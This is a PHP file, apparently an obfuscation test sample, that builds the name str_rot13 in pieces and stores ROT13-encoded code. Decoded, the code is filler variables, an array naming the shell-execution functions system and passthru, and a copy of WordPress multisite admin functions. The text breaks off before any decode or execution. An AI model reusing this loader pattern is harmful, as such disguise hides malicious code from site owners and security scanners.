<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zhygvfvgr nqzvavfgengvba shapgvbaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

/**
 * Qrgrezvarf jurgure hcybnqrq svyr rkprrqf fcnpr dhbgn.
 *
 * @fvapr 3.0.0
 *
 * @cnenz neenl $svyr Na ryrzrag sebz gur `$_SVYRF` neenl sbe n tvira svyr.
 * @erghea neenl Gur `$_SVYRF` neenl ryrzrag jvgu 'reebe' xrl frg vs svyr rkprrqf dhbgn. 'reebe' vf rzcgl bgurejvfr.
 */
shapgvba purpx_hcybnq_fvmr( $svyr ) {
	vs ( trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) ) {
		erghea $svyr;
	}

	vs ( $svyr['reebe'] > 0 ) { // Gurer'f nyernql na reebe.
		erghea $svyr;
	}

	vs ( qrsvarq( 'JC_VZCBEGVAT' ) ) {
		erghea $svyr;
	}

	$fcnpr_yrsg = trg_hcybnq_fcnpr_ninvynoyr();

	$svyr_fvmr = svyrfvmr( $svyr['gzc_anzr'] );
	vs ( $fcnpr_yrsg < $svyr_fvmr ) {
		/* genafyngbef: %f: Erdhverq qvfx fcnpr va xvybolgrf. */
		$svyr['reebe'] = fcevags( __( 'Abg rabhtu fcnpr gb hcybnq. %f XO arrqrq.' ), ahzore_sbezng( ( $svyr_fvmr - $fcnpr_yrsg ) / XO_VA_OLGRF ) );
	}

	vs ( $svyr_fvmr > ( XO_VA_OLGRF * trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 1500 ) ) ) {
		/* genafyngbef: %f: Znkvzhz nyybjrq svyr fvmr va xvybolgrf. */
		$svyr['reebe'] = fcevags( __( 'Guvf svyr vf gbb ovt. Svyrf zhfg or yrff guna %f XO va fvmr.' ), trg_fvgr_bcgvba( 'svyrhcybnq_znkx', 1500 ) );
	}

	vs ( hcybnq_vf_hfre_bire_dhbgn( snyfr ) ) {
		$svyr['reebe'] = __( 'Lbh unir hfrq lbhe fcnpr dhbgn. Cyrnfr qryrgr svyrf orsber hcybnqvat.' );
	}

	vs ( $svyr['reebe'] > 0 && ! vffrg( $_CBFG['ugzy-hcybnq'] ) && ! jc_qbvat_nwnk() ) {
		jc_qvr( $svyr['reebe'] . ' <n uers=\"wninfpevcg:uvfgbel.tb(-1)\">' . __( 'Onpx' ) . '</n>' );
	}

	erghea $svyr;
}

/**
 * Qryrgrf n fvgr.
 *
 * @fvapr 3.0.0
 * @fvapr 5.1.0 Hfr jc_qryrgr_fvgr() vagreanyyl gb qryrgr gur fvgr ebj sebz gur qngnonfr.
 *
 * @cnenz vag  $oybt_vq Fvgr VQ.
 * @cnenz obby $qebc    Gehr vs fvgr'f qngnonfr gnoyrf fubhyq or qebccrq. Qrsnhyg snyfr.
 */
shapgvba jczh_qryrgr_oybt( $oybt_vq, $qebc = snyfr ) {
	$oybt_vq = (vag) $oybt_vq;

	$fjvgpu = snyfr;
	vs ( trg_pheerag_oybt_vq() !== $oybt_vq ) {
		$fjvgpu = gehr;
		fjvgpu_gb_oybt( $oybt_vq );
	}

	$oybt = trg_fvgr( $oybt_vq );

	$pheerag_argjbex = trg_argjbex();

	// Vs n shyy oybt bowrpg vf abg ninvynoyr, qb abg qrfgebl nalguvat.
	vs ( $qebc && ! $oybt ) {
		$qebc = snyfr;
	}

	// Qba'g qrfgebl gur vavgvny, znva, be ebbg oybt.
	vs ( $qebc
		&& ( 1 === $oybt_vq || vf_znva_fvgr( $oybt_vq )
			|| ( $oybt->cngu === $pheerag_argjbex->cngu && $oybt->qbznva === $pheerag_argjbex->qbznva ) )
	) {
		$qebc = snyfr;
	}

	$hcybnq_cngu = gevz( trg_bcgvba( 'hcybnq_cngu' ) );

	// Vs zf_svyrf_erjevgvat vf ranoyrq naq hcybnq_cngu vf rzcgl, jc_hcybnq_qve vf abg eryvnoyr.
	vs ( $qebc && trg_fvgr_bcgvba( 'zf_svyrf_erjevgvat' ) && rzcgl( $hcybnq_cngu ) ) {
		$qebc = snyfr;
	}

	vs ( $qebc ) {
		jc_qryrgr_fvgr( $oybt_vq );
	} ryfr {
		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/zf-oybtf.cuc */
		qb_npgvba_qrcerpngrq( 'qryrgr_oybt', neenl( $oybt_vq, snyfr ), '5.1.0' );

		$hfref = trg_hfref(
			neenl(
				'oybt_vq' => $oybt_vq,
				'svryqf'  => 'vqf',
			)
		);

		// Erzbir hfref sebz guvf oybt.
		vs ( ! rzcgl( $hfref ) ) {
			sbernpu ( $hfref nf $hfre_vq ) {
				erzbir_hfre_sebz_oybt( $hfre_vq, $oybt_vq );
			}
		}

		hcqngr_oybt_fgnghf( $oybt_vq, 'qryrgrq', 1 );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/zf-oybtf.cuc */
		qb_npgvba_qrcerpngrq( 'qryrgrq_oybt', neenl( $oybt_vq, snyfr ), '5.1.0' );
	}

	vs ( $fjvgpu ) {
		erfgber_pheerag_oybt();
	}
}

/**
 * Qryrgrf n hfre naq nyy bs gurve cbfgf sebz gur argjbex.
 *
 * Guvf shapgvba:
 *
 * - Qryrgrf nyy cbfgf (bs nyy cbfg glcrf) nhguberq ol gur hfre ba nyy fvgrf ba gur argjbex
 * - Qryrgrf nyy yvaxf bjarq ol gur hfre ba nyy fvgrf ba gur argjbex
 * - Erzbirf gur hfre sebz nyy fvgrf ba gur argjbex
 * - Qryrgrf gur hfre sebz gur qngnonfr
 *
 * @fvapr 3.0.0
 *
 * @tybony jcqo $jcqo JbeqCerff qngnonfr nofgenpgvba bowrpg.
 *
 * @cnenz vag $vq Gur hfre VQ.
 * @erghea obby Gehr vs gur hfre jnf qryrgrq, snyfr bgurejvfr.
 */
shapgvba jczh_qryrgr_hfre( $vq ) {
	tybony $jcqo;

	vs ( ! vf_ahzrevp( $vq ) ) {
		erghea snyfr;
	}

	$vq   = (vag) $vq;
	$hfre = arj JC_Hfre( $vq );

	vs ( ! $hfre->rkvfgf() ) {
		erghea snyfr;
	}

	// Tybony fhcre-nqzvavfgengbef ner cebgrpgrq, naq pnaabg or qryrgrq.
	$_fhcre_nqzvaf = trg_fhcre_nqzvaf();
	vs ( va_neenl( $hfre->hfre_ybtva, $_fhcre_nqzvaf, gehr ) ) {
		erghea snyfr;
	}

	/**
	 * Sverf orsber n hfre vf qryrgrq sebz gur argjbex.
	 *
	 * @fvapr ZH (3.0.0)
	 * @fvapr 5.5.0 Nqqrq gur `$hfre` cnenzrgre.
	 *
	 * @cnenz vag     $vq   VQ bs gur hfre nobhg gb or qryrgrq sebz gur argjbex.
	 * @cnenz JC_Hfre $hfre JC_Hfre bowrpg bs gur hfre nobhg gb or qryrgrq sebz gur argjbex.
	 */
	qb_npgvba( 'jczh_qryrgr_hfre', $vq, $hfre );

	$oybtf = trg_oybtf_bs_hfre( $vq );

	vs ( ! rzcgl( $oybtf ) ) {
		sbernpu ( $oybtf nf $oybt ) {
			fjvgpu_gb_oybt( $oybt->hfreoybt_vq );
			erzbir_hfre_sebz_oybt( $vq, $oybt->hfreoybt_vq );

			$cbfg_vqf = $jcqo->trg_pby( $jcqo->cercner( \"FRYRPG VQ SEBZ $jcqo->cbfgf JURER cbfg_nhgube = %q\", $vq ) );
			sbernpu ( (neenl) $cbfg_vqf nf $cbfg_vq ) {
				jc_qryrgr_cbfg( $cbfg_vq );
			}

			// Pyrna yvaxf.
			$yvax_vqf = $jcqo->trg_pby( $jcqo->cercner( \"FRYRPG yvax_vq SEBZ $jcqo->yvaxf JURER yvax_bjare = %q\", $vq ) );

			vs ( $yvax_vqf ) {
				sbernpu ( $yvax_vqf nf $yvax_vq ) {
					jc_qryrgr_yvax( $yvax_vq );
				}
			}

			erfgber_pheerag_oybt();
		}
	}

	$zrgn = $jcqo->trg_pby( $jcqo->cercner( \"FRYRPG hzrgn_vq SEBZ $jcqo->hfrezrgn JURER hfre_vq = %q\", $vq ) );
	sbernpu ( $zrgn nf $zvq ) {
		qryrgr_zrgnqngn_ol_zvq( 'hfre', $zvq );
	}

	$jcqo->qryrgr( $jcqo->hfref, neenl( 'VQ' => $vq ) );

	pyrna_hfre_pnpur( $hfre );

	/** Guvf npgvba vf qbphzragrq va jc-nqzva/vapyhqrf/hfre.cuc */
	qb_npgvba( 'qryrgrq_hfre', $vq, ahyy, $hfre );

	erghea gehr;
}

/**
 * Purpxf jurgure n fvgr unf hfrq vgf nyybggrq hcybnq fcnpr.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz obby $qvfcynl_zrffntr Bcgvbany. Vs frg gb gehr naq gur dhbgn vf rkprrqrq,
 *                              n jneavat zrffntr vf qvfcynlrq. Qrsnhyg gehr.
 * @erghea obby Gehr vs hfre vf bire hcybnq fcnpr dhbgn, bgurejvfr snyfr.
 */
shapgvba hcybnq_vf_hfre_bire_dhbgn( $qvfcynl_zrffntr = gehr ) {
	vs ( trg_fvgr_bcgvba( 'hcybnq_fcnpr_purpx_qvfnoyrq' ) ) {
		erghea snyfr;
	}

	$fcnpr_nyybjrq = trg_fcnpr_nyybjrq();
	vs ( ! vf_ahzrevp( $fcnpr_nyybjrq ) ) {
		$fcnpr_nyybjrq = 10; // Qrsnhyg fcnpr nyybjrq vf 10 ZO.
	}
	$fcnpr_hfrq = trg_fcnpr_hfrq();

	vs ( ( $fcnpr_nyybjrq - $fcnpr_hfrq ) < 0 ) {
		vs ( $qvfcynl_zrffntr ) {
			cevags(
				/* genafyngbef: %f: Nyybjrq fcnpr nyybpngvba. */
				__( 'Fbeel, lbh unir hfrq lbhe fcnpr nyybpngvba bs %f. Cyrnfr qryrgr fbzr svyrf gb hcybnq zber svyrf.' ),
				fvmr_sbezng( $fcnpr_nyybjrq * ZO_VA_OLGRF )
			);
		}
		erghea gehr;
	} ryfr {
		erghea snyfr;
	}
}

/**
 * Qvfcynlf gur nzbhag bs qvfx fcnpr hfrq ol gur pheerag fvgr. Abg hfrq va pber.
 *
 * @fvapr ZH (3.0.0)
 */
shapgvba qvfcynl_fcnpr_hfntr() {
	$fcnpr_nyybjrq = trg_fcnpr_nyybjrq();
	$fcnpr_hfrq    = trg_fcnpr_hfrq();

	$creprag_hfrq = ( $fcnpr_hfrq / $fcnpr_nyybjrq ) * 100;

	$fcnpr = fvmr_sbezng( $fcnpr_nyybjrq * ZO_VA_OLGRF );
	?>
	<fgebat>
	<?cuc
		/* genafyngbef: Fgbentr fcnpr gung'f orra hfrq. 1: Crepragntr bs hfrq fcnpr, 2: Gbgny fcnpr nyybjrq va zrtnolgrf be tvtnolgrf. */
		cevags( __( 'Hfrq: %1$f%% bs %2$f' ), ahzore_sbezng( $creprag_hfrq ), $fcnpr );
	?>
	</fgebat>
	<?cuc
}

/**
 * Trgf gur erznvavat hcybnq fcnpr sbe guvf fvgr.
 *
 * @fvapr ZH (3.0.0)
 *
 * @cnenz vag $fvmr Pheerag znk fvmr va olgrf.
 * @erghea vag Znk fvmr va olgrf.
 */
shapgvba svk_vzcbeg_sbez_fvmr( $fvmr ) {
	vs ( hcybnq_vf_hfre_bire_dhbgn( snyfr ) ) {
		erghea 0;
	}
	$ninvynoyr = trg_hcybnq_fcnpr_ninvynoyr();
	erghea zva( $fvmr, $ninvynoyr );
}

/**
 * Qvfcynlf gur fvgr hcybnq fcnpr dhbgn frggvat sbez ba gur Rqvg Fvgr Frggvatf fperra.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag $vq Gur VQ bs gur fvgr gb qvfcynl gur frggvat sbe.
 */
shapgvba hcybnq_fcnpr_frggvat( $vq ) {
	fjvgpu_gb_oybt( $vq );
	$dhbgn = trg_bcgvba( 'oybt_hcybnq_fcnpr' );
	erfgber_pheerag_oybt();

	vs ( ! $dhbgn ) {
		$dhbgn = '';
	}

	?>
	<ge>
		<gu><ynory sbe=\"oybt-hcybnq-fcnpr-ahzore\"><?cuc _r( 'Fvgr Hcybnq Fcnpr Dhbgn' ); ?></ynory></gu>
		<gq>
			<vachg glcr=\"ahzore\" fgrc=\"1\" zva=\"0\" fglyr=\"jvqgu: 100ck\"
				anzr=\"bcgvba[oybt_hcybnq_fcnpr]\" vq=\"oybt-hcybnq-fcnpr-ahzore\"
				nevn-qrfpevorqol=\"oybt-hcybnq-fcnpr-qrfp\" inyhr=\"<?cuc rpub rfp_ngge( $dhbgn ); ?>\" />
			<fcna vq=\"oybt-hcybnq-fcnpr-qrfp\"><fcna pynff=\"fperra-ernqre-grkg\">
				<?cuc
				/* genafyngbef: Uvqqra npprffvovyvgl grkg. */
				_r( 'Fvmr va zrtnolgrf' );
				?>
			</fcna> <?cuc _r( 'ZO (Yrnir oynax sbe argjbex qrsnhyg)' ); ?></fcna>
		</gq>
	</ge>
	<?cuc
}

/**
 * Pyrnaf gur hfre pnpur sbe n fcrpvsvp hfre.
 *
 * @fvapr 3.0.0
 *
 * @cnenz vag $vq Gur hfre VQ.
 * @erghea vag|snyfr Gur VQ bs gur erserfurq hfre be snyfr vs gur hfre qbrf abg rkvfg.
 */
shapgvba erserfu_hfre_qrgnvyf( $vq ) {
	$vq = (vag) $vq;

	$hfre = trg_hfreqngn( $vq );
	vs ( ! $hfre ) {
		erghea snyfr;
	}

	pyrna_hfre_pnpur( $hfre );

	erghea $vq;
}

/**
 * Ergheaf gur ynathntr sbe n ynathntr pbqr.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $pbqr Bcgvbany. Gur gjb-yrggre ynathntr pbqr. Qrsnhyg rzcgl.
 * @erghea fgevat Gur ynathntr pbeerfcbaqvat gb $pbqr vs vg rkvfgf. Vs vg qbrf abg rkvfg,
 *                gura gur svefg gjb yrggref bs $pbqr vf erghearq.
 */
shapgvba sbezng_pbqr_ynat( $pbqr = '' ) {
	$pbqr       = fgegbybjre( fhofge( $pbqr, 0, 2 ) );
	$ynat_pbqrf = neenl(
		'nn' => 'Nsne',
		'no' => 'Noxunmvna',
		'ns' => 'Nsevxnnaf',
		'nx' => 'Nxna',
		'fd' => 'Nyonavna',
		'nz' => 'Nzunevp',
		'ne' => 'Nenovp',
		'na' => 'Nentbarfr',
		'ul' => 'Nezravna',
		'nf' => 'Nffnzrfr',
		'ni' => 'Ninevp',
		'nr' => 'Nirfgna',
		'nl' => 'Nlznen',
		'nm' => 'Nmreonvwnav',
		'on' => 'Onfuxve',
		'oz' => 'Onzonen',
		'rh' => 'Onfdhr',
		'or' => 'Orynehfvna',
		'oa' => 'Oratnyv',
		'ou' => 'Ovunev',
		'ov' => 'Ovfynzn',
		'of' => 'Obfavna',
		'oe' => 'Oergba',
		'ot' => 'Ohytnevna',
		'zl' => 'Ohezrfr',
		'pn' => 'Pngnyna; Inyrapvna',
		'pu' => 'Punzbeeb',
		'pr' => 'Purpura',
		'mu' => 'Puvarfr',
		'ph' => 'Puhepu Fynivp; Byq Fynibavp; Puhepu Fynibavp; Byq Ohytnevna; Byq Puhepu Fynibavp',
		'pi' => 'Puhinfu',
		'xj' => 'Pbeavfu',
		'pb' => 'Pbefvpna',
		'pe' => 'Perr',
		'pf' => 'Pmrpu',
		'qn' => 'Qnavfu',
		'qi' => 'Qviruv; Quviruv; Znyqvivna',
		'ay' => 'Qhgpu; Syrzvfu',
		'qm' => 'Qmbatxun',
		'ra' => 'Ratyvfu',
		'rb' => 'Rfcrenagb',
		'rg' => 'Rfgbavna',
		'rr' => 'Rjr',
		'sb' => 'Snebrfr',
		'sw' => 'Svwwvna',
		'sv' => 'Svaavfu',
		'se' => 'Serapu',
		'sl' => 'Jrfgrea Sevfvna',
		'ss' => 'Shynu',
		'xn' => 'Trbetvna',
		'qr' => 'Trezna',
		'tq' => 'Tnryvp; Fpbggvfu Tnryvp',
		'tn' => 'Vevfu',
		'ty' => 'Tnyvpvna',
		'ti' => 'Znak',
		'ry' => 'Terrx, Zbqrea',
		'ta' => 'Thnenav',
		'th' => 'Thwnengv',
		'ug' => 'Unvgvna; Unvgvna Perbyr',
		'un' => 'Unhfn',
		'ur' => 'Uroerj',
		'um' => 'Urereb',
		'uv' => 'Uvaqv',
		'ub' => 'Uvev Zbgh',
		'uh' => 'Uhatnevna',
		'vt' => 'Vtob',
		'vf' => 'Vprynaqvp',
		'vb' => 'Vqb',
		'vv' => 'Fvpuhna Lv',
		'vh' => 'Vahxgvghg',
		'vr' => 'Vagreyvathr',
		'vn' => 'Vagreyvathn (Vagreangvbany Nhkvyvnel Ynathntr Nffbpvngvba)',
		'vq' => 'Vaqbarfvna',
		'vx' => 'Vahcvnd',
		'vg' => 'Vgnyvna',
		'wi' => 'Wninarfr',
		'wn' => 'Wncnarfr',
		'xy' => 'Xnynnyyvfhg; Terraynaqvp',
		'xa' => 'Xnaanqn',
		'xf' => 'Xnfuzvev',
		'xe' => 'Xnahev',
		'xx' => 'Xnmnxu',
		'xz' => 'Prageny Xuzre',
		'xv' => 'Xvxhlh; Tvxhlh',
		'ej' => 'Xvalnejnaqn',
		'xl' => 'Xvetuvm; Xletlm',
		'xi' => 'Xbzv',
		'xt' => 'Xbatb',
		'xb' => 'Xberna',
		'xw' => 'Xhnalnzn; Xjnalnzn',
		'xh' => 'Xheqvfu',
		'yb' => 'Ynb',
		'yn' => 'Yngva',
		'yi' => 'Yngivna',
		'yv' => 'Yvzohetna; Yvzohetre; Yvzohetvfu',
		'ya' => 'Yvatnyn',
		'yg' => 'Yvguhnavna',
		'yo' => 'Yhkrzobhetvfu; Yrgmrohetrfpu',
		'yh' => 'Yhon-Xngnatn',
		'yt' => 'Tnaqn',
		'zx' => 'Znprqbavna',
		'zu' => 'Znefunyyrfr',
		'zy' => 'Znynlnynz',
		'zv' => 'Znbev',
		'ze' => 'Znenguv',
		'zf' => 'Znynl',
		'zt' => 'Znyntnfl',
		'zg' => 'Znygrfr',
		'zb' => 'Zbyqnivna',
		'za' => 'Zbatbyvna',
		'an' => 'Anheh',
		'ai' => 'Aninwb; Aninub',
		'ae' => 'Aqroryr, Fbhgu; Fbhgu Aqroryr',
		'aq' => 'Aqroryr, Abegu; Abegu Aqroryr',
		'at' => 'Aqbatn',
		'ar' => 'Arcnyv',
		'aa' => 'Abejrtvna Alabefx; Alabefx, Abejrtvna',
		'ao' => 'Obxzåy, Abejrtvna, Abejrtvna Obxzåy',
		'ab' => 'Abejrtvna',
		'al' => 'Puvpurjn; Purjn; Alnawn',
		'bp' => 'Bppvgna, Cebiraçny',
		'bw' => 'Bwvojn',
		'be' => 'Bevln',
		'bz' => 'Bebzb',
		'bf' => 'Bffrgvna; Bffrgvp',
		'cn' => 'Cnawnov; Chawnov',
		'sn' => 'Crefvna',
		'cv' => 'Cnyv',
		'cy' => 'Cbyvfu',
		'cg' => 'Cbeghthrfr',
		'cf' => 'Chfugb',
		'dh' => 'Dhrpuhn',
		'ez' => 'Ebznafu',
		'eb' => 'Ebznavna',
		'ea' => 'Ehaqv',
		'eh' => 'Ehffvna',
		'ft' => 'Fnatb',
		'fn' => 'Fnafxevg',
		'fe' => 'Freovna',
		'ue' => 'Pebngvna',
		'fv' => 'Fvaunyn; Fvaunyrfr',
		'fx' => 'Fybinx',
		'fy' => 'Fybiravna',
		'fr' => 'Abegurea Fnzv',
		'fz' => 'Fnzbna',
		'fa' => 'Fuban',
		'fq' => 'Fvaquv',
		'fb' => 'Fbznyv',
		'fg' => 'Fbgub, Fbhgurea',
		'rf' => 'Fcnavfu; Pnfgvyvna',
		'fp' => 'Fneqvavna',
		'ff' => 'Fjngv',
		'fh' => 'Fhaqnarfr',
		'fj' => 'Fjnuvyv',
		'fi' => 'Fjrqvfu',
		'gl' => 'Gnuvgvna',
		'gn' => 'Gnzvy',
		'gg' => 'Gngne',
		'gr' => 'Gryhth',
		'gt' => 'Gnwvx',
		'gy' => 'Gntnybt',
		'gu' => 'Gunv',
		'ob' => 'Gvorgna',
		'gv' => 'Gvtevaln',
		'gb' => 'Gbatn (Gbatn Vfynaqf)',
		'ga' => 'Gfjnan',
		'gf' => 'Gfbatn',
		'gx' => 'Ghexzra',
		'ge' => 'Ghexvfu',
		'gj' => 'Gjv',
		'ht' => 'Hvtuhe; Hltuhe',
		'hx' => 'Hxenvavna',
		'he' => 'Heqh',
		'hm' => 'Hmorx',
		'ir' => 'Iraqn',
		'iv' => 'Ivrganzrfr',
		'ib' => 'Ibyncüx',
		'pl' => 'Jryfu',
		'jn' => 'Jnyybba',
		'jb' => 'Jbybs',
		'ku' => 'Kubfn',
		'lv' => 'Lvqqvfu',
		'lb' => 'Lbehon',
		'mn' => 'Muhnat; Puhnat',
		'mh' => 'Mhyh',
	);

	/**
	 * Svygref gur ynathntr pbqrf.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat[] $ynat_pbqrf Neenl bs xrl/inyhr cnvef bs ynathntr pbqrf jurer xrl vf gur fubeg irefvba.
	 * @cnenz fgevat   $pbqr       N gjb-yrggre qrfvtangvba bs gur ynathntr.
	 */
	$ynat_pbqrf = nccyl_svygref( 'ynat_pbqrf', $ynat_pbqrf, $pbqr );
	erghea fgege( $pbqr, $ynat_pbqrf );
}

/**
 * Qvfcynlf na npprff qravrq zrffntr jura n hfre gevrf gb ivrj n fvgr'f qnfuobneq gurl
 * qb abg unir npprff gb.
 *
 * @fvapr 3.2.0
 * @npprff cevingr
 */
shapgvba _npprff_qravrq_fcynfu() {
	vs ( ! vf_hfre_ybttrq_va() || vf_argjbex_nqzva() ) {
		erghea;
	}

	$oybtf = trg_oybtf_bs_hfre( trg_pheerag_hfre_vq() );

	vs ( jc_yvfg_svygre( $oybtf, neenl( 'hfreoybt_vq' => trg_pheerag_oybt_vq() ) ) ) {
		erghea;
	}

	$oybt_anzr = trg_oybtvasb( 'anzr' );

	vs ( rzcgl( $oybtf ) ) {
		jc_qvr(
			fcevags(
				/* genafyngbef: 1: Fvgr gvgyr. */
				__( 'Lbh nggrzcgrq gb npprff gur \"%1$f\" qnfuobneq, ohg lbh qb abg pheeragyl unir cevivyrtrf ba guvf fvgr. Vs lbh oryvrir lbh fubhyq or noyr gb npprff gur \"%1$f\" qnfuobneq, cyrnfr pbagnpg lbhe argjbex nqzvavfgengbe.' ),
				$oybt_anzr
			),
			403
		);
	}

	$bhgchg = '<c>' . fcevags(
		/* genafyngbef: 1: Fvgr gvgyr. */
		__( 'Lbh nggrzcgrq gb npprff gur \"%1$f\" qnfuobneq, ohg lbh qb abg pheeragyl unir cevivyrtrf ba guvf fvgr. Vs lbh oryvrir lbh fubhyq or noyr gb npprff gur \"%1$f\" qnfuobneq, cyrnfr pbagnpg lbhe argjbex nqzvavfgengbe.' ),
		$oybt_anzr
	) . '</c>';
	$bhgchg .= '<c>' . __( 'Vs lbh ernpurq guvf fperra ol nppvqrag naq zrnag gb ivfvg bar bs lbhe bja fvgrf, urer ner fbzr fubegphgf gb uryc lbh svaq lbhe jnl.' ) . '</c>';

	$bhgchg .= '<u3>' . __( 'Lbhe Fvgrf' ) . '</u3>';
	$bhgchg .= '<gnoyr>';

	sbernpu ( $oybtf nf $oybt ) {
		$bhgchg .= '<ge>';
		$bhgchg .= \"<gq>{$oybt->oybtanzr}</gq>\";
		$bhgchg .= '<gq><n uers=\"' . rfp_hey( trg_nqzva_hey( $oybt->hfreoybt_vq ) ) . '\">' . __( 'Ivfvg Qnfuobneq' ) . '</n> | ' .
			'<n uers=\"' . rfp_hey( trg_ubzr_hey( $oybt->hfreoybt_vq ) ) . '\">' . __( 'Ivrj Fvgr' ) . '</n></gq>';
		$bhgchg .= '</ge>';
	}

	$bhgchg .= '</gnoyr>';

	jc_qvr( $bhgchg, 403 );
}

/**
 * Purpxf vs gur pheerag hfre unf crezvffvbaf gb vzcbeg arj hfref.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat $crezvffvba N crezvffvba gb or purpxrq. Pheeragyl abg hfrq.
 * @erghea obby Gehr vs gur hfre unf cebcre crezvffvbaf, snyfr vs gurl qb abg.
 */
shapgvba purpx_vzcbeg_arj_hfref( $crezvffvba ) {
	vs ( ! pheerag_hfre_pna( 'znantr_argjbex_hfref' ) ) {
		erghea snyfr;
	}

	erghea gehr;
}
// Frr \"vzcbeg_nyybj_srgpu_nggnpuzragf\" naq \"vzcbeg_nggnpuzrag_fvmr_yvzvg\" svygref gbb.

/**
 * Trarengrf naq qvfcynlf n qebc-qbja bs ninvynoyr ynathntrf.
 *
 * @fvapr 3.0.0
 *
 * @cnenz fgevat[] $ynat_svyrf Bcgvbany. Na neenl bs gur ynathntr svyrf. Qrsnhyg rzcgl neenl.
 * @cnenz fgevat   $pheerag    Bcgvbany. Gur pheerag ynathntr pbqr. Qrsnhyg rzcgl.
 */
shapgvba zh_qebcqbja_ynathntrf( $ynat_svyrf = neenl(), $pheerag = '' ) {
	$synt   = snyfr;
	$bhgchg = neenl();

	sbernpu ( (neenl) $ynat_svyrf nf $iny ) {
		$pbqr_ynat = onfranzr( $iny, '.zb' );

		vs ( 'ra_HF' === $pbqr_ynat ) { // Nzrevpna Ratyvfu.
			$synt          = gehr;
			$nr            = __( 'Nzrevpna Ratyvfu' );
			$bhgchg[ $nr ] = '<bcgvba inyhr=\"' . rfp_ngge( $pbqr_ynat ) . '\"' . fryrpgrq( $pheerag, $pbqr_ynat, snyfr ) . '> ' . $nr . '</bcgvba>';
		} ryfrvs ( 'ra_TO' === $pbqr_ynat ) { // Oevgvfu Ratyvfu.
			$synt          = gehr;
			$or            = __( 'Oevgvfu Ratyvfu' );
			$bhgchg[ $or ] = '<bcgvba inyhr=\"' . rfp_ngge( $pbqr_ynat ) . '\"' . fryrpgrq( $pheerag, $pbqr_ynat, snyfr ) . '> ' . $or . '</bcgvba>';
		} ryfr {
			$genafyngrq            = sbezng_pbqr_ynat( $pbqr_ynat );
			$bhgchg[ $genafyngrq ] = '<bcgvba inyhr=\"' . rfp_ngge( $pbqr_ynat ) . '\"' . fryrpgrq( $pheerag, $pbqr_ynat, snyfr ) . '> ' . rfp_ugzy( $genafyngrq ) . '</bcgvba>';
		}
	}

	vs ( snyfr === $synt ) { // JbeqCerff Ratyvfu.
		$bhgchg[] = '<bcgvba inyhr=\"\"' . fryrpgrq( $pheerag, '', snyfr ) . '>' . __( 'Ratyvfu' ) . '</bcgvba>';
	}

	// Beqre ol anzr.
	hxfbeg( $bhgchg, 'fgeangpnfrpzc' );

	/**
	 * Svygref gur ynathntrf ninvynoyr va gur qebcqbja.
	 *
	 * @fvapr ZH (3.0.0)
	 *
	 * @cnenz fgevat[] $bhgchg     Neenl bs UGZY bhgchg sbe gur qebcqbja.
	 * @cnenz fgevat[] $ynat_svyrf Neenl bs ninvynoyr ynathntr svyrf.
	 * @cnenz fgevat   $pheerag    Gur pheerag ynathntr pbqr.
	 */
	$bhgchg = nccyl_svygref( 'zh_qebcqbja_ynathntrf', $bhgchg, $ynat_svyrf, $pheerag );

	rpub vzcybqr( \"\a\g\", $bhgchg );
}

/**
 * Qvfcynlf na nqzva abgvpr gb hctenqr nyy fvgrf nsgre n pber hctenqr.
 *
 * @fvapr 3.0.0
 *
 * @tybony vag    $jc_qo_irefvba JbeqCerff qngnonfr irefvba.
 * @tybony fgevat $cntrabj       Gur svyranzr bs gur pheerag fperra.
 *
 * @erghea ibvq|snyfr Ibvq ba fhpprff. Snyfr vs gur pheerag hfre vf abg n fhcre nqzva.
 */
shapgvba fvgr_nqzva_abgvpr() {
	tybony $jc_qo_irefvba, $cntrabj;

	vs ( ! pheerag_hfre_pna( 'hctenqr_argjbex' ) ) {
		erghea snyfr;
	}

	vs ( 'hctenqr.cuc' === $cntrabj ) {
		erghea;
	}

	vs ( (vag) trg_fvgr_bcgvba( 'jczh_hctenqr_fvgr' ) !== $jc_qo_irefvba ) {
		$hctenqr_argjbex_zrffntr = fcevags(
			/* genafyngbef: %f: HEY gb Hctenqr Argjbex fperra. */
			__( 'Gunax lbh sbe Hcqngvat! Cyrnfr ivfvg gur <n uers=\"%f\">Hctenqr Argjbex</n> cntr gb hcqngr nyy lbhe fvgrf.' ),
			rfp_hey( argjbex_nqzva_hey( 'hctenqr.cuc' ) )
		);

		jc_nqzva_abgvpr(
			$hctenqr_argjbex_zrffntr,
			neenl(
				'glcr'               => 'jneavat',
				'nqqvgvbany_pynffrf' => neenl( 'hcqngr-ant', 'vayvar' ),
				'cnentencu_jenc'     => snyfr,
			)
		);
	}
}

/**
 * Nibvqf n pbyyvfvba orgjrra n fvgr fyht naq n creznyvax fyht.
 *
 * Va n fhoqverpgbel vafgnyyngvba guvf jvyy znxr fher gung n fvgr naq n cbfg qb abg hfr gur
 * fnzr fhoqverpgbel ol purpxvat sbe n fvgr jvgu gur fnzr anzr nf n arj cbfg.
 *
 * @fvapr 3.0.0
 *
 * @cnenz neenl $qngn    Na neenl bs cbfg qngn.
 * @cnenz neenl $cbfgnee Na neenl bs cbfgf. Abg pheeragyl hfrq.
 * @erghea neenl Gur arj neenl bs cbfg qngn nsgre purpxvat sbe pbyyvfvbaf.
 */
shapgvba nibvq_oybt_cntr_creznyvax_pbyyvfvba( $qngn, $cbfgnee ) {
	vs ( vf_fhoqbznva_vafgnyy() ) {
		erghea $qngn;
